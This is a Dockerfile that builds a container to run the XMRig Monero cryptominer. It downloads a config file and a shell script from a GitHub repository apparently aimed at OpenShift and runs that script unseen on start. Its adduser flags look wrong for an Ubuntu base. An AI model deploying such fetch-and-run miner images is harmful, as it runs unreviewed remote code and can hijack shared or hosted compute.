FROM  ubuntu
RUN adduser -S -D -H -h /xmrig-2.6.2 xminer
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.6.2/xmrig-2.6.2-xenial-amd64.tar.gz
RUN tar -xvzf xmrig-2.6.2-xenial-amd64.tar.gz
USER xminer
WORKDIR xmrig-2.6.2/
RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/config.json
RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/script.sh
RUN chmod a+x script.sh
RUN sed -i -e 's/\r$//' script.sh
CMD ./script.sh
